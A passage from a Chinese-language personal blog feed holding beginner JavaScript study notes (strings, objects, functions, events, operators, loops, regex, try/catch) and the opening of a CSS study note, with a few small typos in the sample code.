class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> a =<span class="hljs-string">&quot;hello&quot;</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">let</span> letter =a[<span class="hljs-number">3</span>];</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementId</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span>=letter;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>计算<strong>字符串长度</strong>可用内置属性length</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> txt =<span class="hljs-string">&quot;qwertyu&quot;</span>;<br><span class="hljs-keyword">var</span> sln =txt.<span class="hljs-property">length</span>;<br></code></pre></td></tr></table></figure><p>一些<strong>特殊字符</strong>的写法，如双引号内还有双引号，可用<strong>转义字符</strong>来转义</p><table><thead><tr><th align="left">代码</th><th align="left">输出</th></tr></thead><tbody><tr><td align="left">\‘</td><td align="left">单引号</td></tr><tr><td align="left">\“</td><td align="left">双引号</td></tr><tr><td align="left">\\</td><td align="left">反斜杠</td></tr><tr><td align="left">\n</td><td align="left">换行</td></tr><tr><td align="left">\r</td><td align="left">回车</td></tr><tr><td align="left">\t</td><td align="left">tab(制表符)</td></tr><tr><td align="left">\b</td><td align="left">退格符</td></tr><tr><td align="left">\f</td><td align="left">换页符</td></tr></tbody></table><blockquote><p>注：表格前排的代码因为.md直接转义成转移后的模样，所以我多加了一个</p></blockquote><p><strong>字符串可以是对象</strong>通常， JavaScript 字符串是原始值，可以使用字符创建： **var firstName &#x3D; “John”**但我们也可以使用 new 关键字将字符串定义为一个对象： <strong>var firstName &#x3D; new String(“John”)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;John&quot;</span>;              <span class="hljs-comment">// x 是字符串</span></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> y = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;John&quot;</span>);  <span class="hljs-comment">// y 是一个对象</span></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span> = x===y;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>=== 为绝对相等，即数据类型与值都必须相等。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注：不要创建 String 对象。它会拖慢执行速度，并可能产生其他副作用</p></blockquote><p>声明变量类型：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> carname=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>;<br><span class="hljs-keyword">var</span> x=      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>;<br><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;John&quot;</span>;<br><span class="hljs-keyword">var</span> y = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">typeof</span> x <span class="hljs-comment">//  返回 String</span><br><span class="hljs-keyword">typeof</span> y <span class="hljs-comment">// 返回 Object</span><br></code></pre></td></tr></table></figure><h4 id="字符串属性"><a href="#字符串属性" class="headerlink" title="字符串属性"></a><strong>字符串属性</strong></h4><table><thead><tr><th align="left">属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">constructor</td><td align="left">返回创建字符串属性的函数</td></tr><tr><td align="left">length</td><td align="left">返回字符串的长度</td></tr><tr><td align="left">prototype</td><td align="left">允许您向对象添加属性和方法</td></tr></tbody></table><h4 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h4><p>JavaScript 中的模板字符串是一种方便的字符串语法，允许你在字符串中嵌入表达式和变量。模板字符串使用反引号 <strong>&#96;&#96;</strong> 作为字符串的定界符分隔的字面量。</p><blockquote><p>注：反引号是英语输入法ESC下面那个</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//字符串中可用同时用单引号和双引号</span><br><span class="hljs-keyword">let</span> text =<span class="hljs-string">`he&#x27;s often called &quot;JAVA&quot;`</span>;<br><span class="hljs-comment">//模板字符串支持多行文本,而无需使用特殊转义字符</span><br></code></pre></td></tr></table></figure><p>还包括占位符——${expression}</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;p id=<span class="hljs-string">&quot;demo&quot;</span>&gt;&lt;/p&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Internet Explorer 不支持模板字面量。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> name = <span class="hljs-string">&#x27;Runoob&#x27;</span>;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> age = <span class="hljs-number">30</span>;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">const</span> message = <span class="hljs-string">`My name is <span class="hljs-subst">$&#123;name&#125;</span> and I&#x27;m <span class="hljs-subst">$&#123;age&#125;</span> years old.`</span>;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span> = message;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="hljs-comment">//输出My name is Runoob and I&#x27;m 30 years old.</span><br></code></pre></td></tr></table></figure><h2 id="8-对象"><a href="#8-对象" class="headerlink" title="8.对象"></a>8.对象</h2><p>JavaScript对象是变量的容器</p><p>对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 <strong>name:value</strong> 对呈现。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> car = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Fiat&quot;</span>, <span class="hljs-attr">model</span>:<span class="hljs-number">500</span>, <span class="hljs-attr">color</span>:<span class="hljs-string">&quot;white&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a><strong>对象属性</strong></h3><p>：JavaScript对象是键值对的容器，键值对的通常写法是：name:value（键与值以冒号分割），键值对在JavaScript对象称为对象属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//对象属性的两种寻址方式</span><br>name=person.<span class="hljs-property">lastname</span>;<br>name=person[<span class="hljs-string">&quot;lastname&quot;</span>];<br></code></pre></td></tr></table></figure><h3 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a><strong>对象方法</strong></h3><p>：对象的方法定义了一个函数，并作为对象的属性存储。</p><p>对象方法通过添加 () 调用 (作为一个函数)。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//fullname()是作为person对象的一个方法，而fullname是作为一个属性如果使用fullname属性，不添加()，它会返回函数的定义</span><br>&lt;p id=<span class="hljs-string">&quot;demo1&quot;</span>&gt;&lt;/p&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">var</span> person = &#123;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-attr">firstName</span>: <span class="hljs-string">&quot;John&quot;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">    lastName : <span class="hljs-string">&quot;Doe&quot;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">    id : <span class="hljs-number">5566</span>,</span></span><br><span class="language-javascript"><span class="language-xml">    fullName : <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span></span><br><span class="language-javascript"><span class="language-xml">&#123;</span></span><br><span class="language-javascript"><span class="language-xml">       <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span>;</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo1&quot;</span>).<span class="hljs-property">innerHTML</span> = person.<span class="hljs-title function_">fullName</span>();</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo2&quot;</span>).<span class="hljs-property">innerHTML</span> = person.<span class="hljs-property">fullName</span>;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="hljs-comment">//输出为John Doe</span><br><span class="hljs-comment">/*输出为function() </span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">       return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="9-函数"><a href="#9-函数" class="headerlink" title="9.函数"></a>9.函数</h2><p>关键词为function;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">functionname</span>(<span class="hljs-params"></span>)<br>&#123;<br>   <span class="hljs-comment">//执行代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>带参数的函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myfunction</span>(<span class="hljs-params">var1,var2</span>)<br>&#123;<br><span class="hljs-comment">//代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>带返回值的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myfunction</span>(<span class="hljs-params"></span>)<br>&#123;<br><span class="hljs-comment">//代码</span><br><span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-事件："><a href="#10-事件：" class="headerlink" title="10.事件："></a>10.事件：</h2><p>常见的HTML事件</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>onchange</td><td>HTML 元素改变</td></tr><tr><td>onclick</td><td>用户点击 HTML 元素</td></tr><tr><td>onmouseover</td><td>鼠标指针移动到指定的元素上时发生</td></tr><tr><td>onmouseout</td><td>用户从一个 HTML 元素上移开鼠标时发生</td></tr><tr><td>onkeydown</td><td>用户按下键盘按键</td></tr><tr><td>onload</td><td>浏览器已完成页面的加载</td></tr></tbody></table><blockquote><p>注：更多的在HTML DOM事件中，<a src="[HTML DOM 事件对象 | 菜鸟教程](https://www.runoob.com/jsref/dom-obj-event.html)">完整版</a></p></blockquote><h2 id="11-运算符"><a href="#11-运算符" class="headerlink" title="11.运算符"></a>11.运算符</h2><blockquote><p>注：其规则和C语言大部分一样，就不一一列出，下面只记录一些特殊的</p></blockquote><p>  <strong>+</strong>  可用于把文本值或字符串变量加起来(连接起来)，eg：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">txt1=<span class="hljs-string">&quot;What a very&quot;</span>;<br>txt2=<span class="hljs-string">&quot;nice day&quot;</span>;<br>txt3=txt1+txt2;<br><span class="hljs-comment">//输出What a verynice day</span><br><span class="hljs-comment">//若想在两个字符串中加空格</span><br>第一种txt1=<span class="hljs-string">&quot;What a very &quot;</span>;<br>第二种txt3=txt1+<span class="hljs-string">&quot; &quot;</span>+txt2;<br><span class="hljs-comment">//两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串</span><br>x=<span class="hljs-number">5</span>+<span class="hljs-number">5</span>;<br>y=<span class="hljs-string">&quot;5&quot;</span>+<span class="hljs-number">5</span>;<br>z=<span class="hljs-string">&quot;Hello&quot;</span>+<span class="hljs-number">5</span>;<br><span class="hljs-comment">//10</span><br><span class="hljs-comment">//55</span><br><span class="hljs-comment">//Hello5</span><br></code></pre></td></tr></table></figure><h2 id="12-比较与逻辑运算符"><a href="#12-比较与逻辑运算符" class="headerlink" title="12.比较与逻辑运算符"></a>12.比较与逻辑运算符</h2><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">等于</td><td align="left">x&#x3D;&#x3D;8</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left">&#x3D;&#x3D;&#x3D;</td><td align="left">绝对等于（值和类型均相等）</td><td align="left">x&#x3D;&#x3D;&#x3D;”5”</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left">!&#x3D;</td><td align="left">不等于</td><td align="left">x!&#x3D;8</td><td align="left"><em>true</em></td></tr><tr><td align="left">!&#x3D;&#x3D;</td><td align="left">严格不等于运算符（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!&#x3D;&#x3D;”5”</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x!&#x3D;&#x3D;5</td><td align="left"><em>false</em></td></tr></tbody></table><blockquote><p>逻辑运算符和C语言一致</p></blockquote><p>条件运算符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">variablename=(condition)?<span class="hljs-attr">value1</span>:value2 <br>voteable=(age&lt;<span class="hljs-number">18</span>)?<span class="hljs-string">&quot;年龄太小&quot;</span>:<span class="hljs-string">&quot;年龄已达到&quot;</span>;<br><span class="hljs-comment">//如果变量age中值小于18，则voteable赋值&quot;年龄太小&quot;</span><br></code></pre></td></tr></table></figure><h2 id="13-条件语句"><a href="#13-条件语句" class="headerlink" title="13.条件语句"></a>13.条件语句</h2><ul>    <li>if</li>    <li>if else</li>    <li>if elif else</li>    <li>swtich</li></ul>> 用法与C语言一样<h2 id="14-循环语句"><a href="#14-循环语句" class="headerlink" title="14.循环语句"></a>14.循环语句</h2><ul><li><strong>for</strong> - 循环代码块一定的次数</li><li><strong>for&#x2F;in</strong> - 循环遍历对象的属性</li><li><strong>while</strong> - 当指定的条件为 true 时循环指定的代码块</li><li><strong>do&#x2F;while</strong> - 同样当指定的条件为 true 时循环指定的代码块</li></ul><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)<br>&#123;<br>      x=x + <span class="hljs-string">&quot;该数字为 &quot;</span> + i + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-comment">//for in 的使用</span><br><span class="hljs-keyword">var</span> person=&#123;<span class="hljs-attr">fname</span>:<span class="hljs-string">&quot;Bill&quot;</span>,<span class="hljs-attr">lname</span>:<span class="hljs-string">&quot;Gates&quot;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">56</span>&#125;; <br><br><span class="hljs-keyword">for</span> (x <span class="hljs-keyword">in</span> person)  <span class="hljs-comment">// x 为属性名</span><br>&#123;<br>    txt=txt + person[x];<br>&#125;<br><span class="hljs-comment">//输出：BillGates56</span><br></code></pre></td></tr></table></figure><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">while</span> <span class="hljs-comment">(*条件*)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  *需要执行的代码*</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">//do while循环</span><br><span class="hljs-keyword">do</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    需要执行的代码</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-keyword">while</span> (条件);<br></code></pre></td></tr></table></figure><h2 id="15-break和continue"><a href="#15-break和continue" class="headerlink" title="15.break和continue"></a>15.break和continue</h2><p>break 语句可用于跳出循环。</p><p><strong>continue 语句</strong>中断当前的循环中的迭代，然后继续循环下一个迭代。 </p><p>continue 语句（带有或不带标签引用）只能用在循环中。</p><p>break 语句（不带标签引用），只能用在循环或 switch 中。</p><p>通过标签引用，break 语句可用于<strong>跳出任何 JavaScript 代码块</strong>：</p><blockquote><p>补：标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">label</span>:statements<br><span class="hljs-keyword">break</span> statements;<br><span class="hljs-comment">//eg：</span><br>cars=[<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;Saab&quot;</span>,<span class="hljs-string">&quot;Ford&quot;</span>];<br><span class="hljs-attr">list</span>:&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br><span class="hljs-keyword">break</span> list;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">3</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">4</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(cars[<span class="hljs-number">5</span>] + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <br>&#125;<br><span class="hljs-comment">//仅输出</span><br><span class="hljs-comment">/*BMW</span><br><span class="hljs-comment">Volvo</span><br><span class="hljs-comment">Saab*/</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="16-typeof-null-和-undefined"><a href="#16-typeof-null-和-undefined" class="headerlink" title="16.typeof, null, 和 undefined"></a>16.typeof, null, 和 undefined</h2><ul><li><p>使用 typeof 操作符来检测变量的数据类型。</p></li><li><p>在 JavaScript 中 null 表示 “什么都没有”。null是一个只有一个值的特殊类型。表示一个空对象引用。</p></li><li><p>在 JavaScript 中, <strong>undefined</strong> 是一个没有设置值的变量。<strong>typeof</strong> 一个没有值的变量会返回 <strong>undefined</strong>。</p></li></ul><p><strong>null 和 undefined 的值相等，但类型不等</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span>              <span class="hljs-comment">// undefined</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>                  <span class="hljs-comment">// object</span><br><span class="hljs-literal">null</span> === <span class="hljs-literal">undefined</span>           <span class="hljs-comment">// false</span><br><span class="hljs-literal">null</span> == <span class="hljs-literal">undefined</span>            <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="17-正则表达式"><a href="#17-正则表达式" class="headerlink" title="17.正则表达式"></a>17.正则表达式</h2><p><strong>&#x2F;正则表达式主体&#x2F;修饰符(可选)</strong><a><a href="https://www.runoob.com/regexp/regexp-tutorial.html">点击学习</a></a></p><table><thead><tr><th align="left">修饰符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">i</td><td align="left">执行对大小写不敏感的匹配。</td></tr><tr><td align="left">g</td><td align="left">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td></tr><tr><td align="left">m</td><td align="left">执行多行匹配。</td></tr></tbody></table><h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><p>方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//使用正则表达式</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit Runoob!&quot;</span>; <br><span class="hljs-keyword">var</span> n = str.<span class="hljs-title function_">search</span>(<span class="hljs-regexp">/Runoob/i</span>);<br><span class="hljs-comment">//使用字符串</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit Runoob!&quot;</span>; <br><span class="hljs-keyword">var</span> n = str.<span class="hljs-title function_">search</span>(<span class="hljs-string">&quot;Runoob&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="replace"><a href="#replace" class="headerlink" title="replace()"></a><strong>replace()</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//使用正则表达式</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span>; <br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/microsoft/i</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br><span class="hljs-comment">//使用字符串</span><br><span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span>; <br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;Microsoft&quot;</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="18-错误—throw、try和catch"><a href="#18-错误—throw、try和catch" class="headerlink" title="18.错误—throw、try和catch"></a>18.错误—throw、try和catch</h2><p><strong>try</strong> 语句测试代码块的错误。</p><p><strong>catch</strong> 语句处理错误。</p><p><strong>throw</strong> 语句创建自定义错误。</p><p><strong>finally</strong> 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行。</p><h3 id="try和catch"><a href="#try和catch" class="headerlink" title="try和catch"></a>try和catch</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-string">...</span>    <span class="hljs-string">//</span>异常的抛出<br>&#125; catch<span class="hljs-params">(e)</span> &#123;<br>    <span class="hljs-string">...</span>    <span class="hljs-string">//</span>异常的捕获与处理<br>&#125; finally &#123;<br>    <span class="hljs-string">...</span>    <span class="hljs-string">//</span>结束处理<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS学习</title>
    <link href="/2025/03/01/CSS%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/01/CSS%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>注：CSS先学到这吧，虽然可能很少，只学了选择器，嘿嘿不管了，作者进军JavaScript了</p><h3 id="一、css导入方式"><a href="#一、css导入方式" class="headerlink" title="一、css导入方式"></a>一、css导入方式</h3><blockquote><p>注：优先级：就近原则</p></blockquote><h4 id=""><a href="#" class="headerlink" title=""></a><!--行内样式--></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:red&quot;</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><!--内部样式--></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span 